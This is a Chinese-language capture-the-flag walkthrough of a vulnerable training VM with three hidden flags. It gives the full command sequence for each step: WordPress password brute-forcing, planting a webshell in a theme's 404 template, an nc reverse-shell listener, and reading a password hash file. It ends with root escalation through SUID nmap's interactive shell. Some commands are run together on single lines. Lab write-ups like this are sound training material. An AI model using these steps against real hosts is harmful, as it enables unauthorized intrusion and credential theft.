虚拟机简介：您的目标是找到全部三个。每个密钥逐渐难以找到

目标：3个flag

级别：初学者-中级

1、通过arp-scan检测主机IP地址

arp-scan -l

2、通过nmap进行端口扫描

nmap -A -sS -sV -v -p- 192.168.1.7
查看开放80、443端口,22端口已经关闭

3、WEB渗透测试

3.1 使用dirb进行扫描，发现robots.txt中提示有一个flag和字典文件

访问key-1-of-3.txt得到第一个flag

下载字典文件

3.2 使用burp加载下载的字典，爆破WordPress用户名，得到用户名为：elliot

3.3 使用字典爆破密码，得到密码为：ER28-0652

wpscan --url http://192.168.1.101 -U elliot -P fsocity.dic

3.4 登录站点，并在404模板中添加webshell

在kali中开启NC监听

nc -nlvp 4444

访问webshell查看，获取到反弹shell

http://192.168.1.7/wp-content/themes/twentyfifteen/404.php

3.5 使用python优化脚本，查看到robot文件夹中有两个文件，password文件中保存robot的密码

python -c 'import pty; pty.spawn("/bin/bash")'ls /home/robot -lahcat /home/robot/key-2-of-3.txtcat /home/robot/password.raw-md5

3.6 使用在线md5解密后得到密码，切换到robot账号

su - robot

3.7 查看当前用户无sudo权限，查看用户名目录下的key-2-of-3.txt，获取第二个flag

sudo -lcat /home/robot/key-2-of-3.txt

4、系统提权

4.1 查找具有SUID的二进制文件，查看nmap可以进行提权

find / -perm -u=s -type f 2>/dev/null

4.2 使用nmap交互进行提权

nmap --interactive!sh

4.3 获取flag

ls /rootcat /root/key-3-of-3.txt
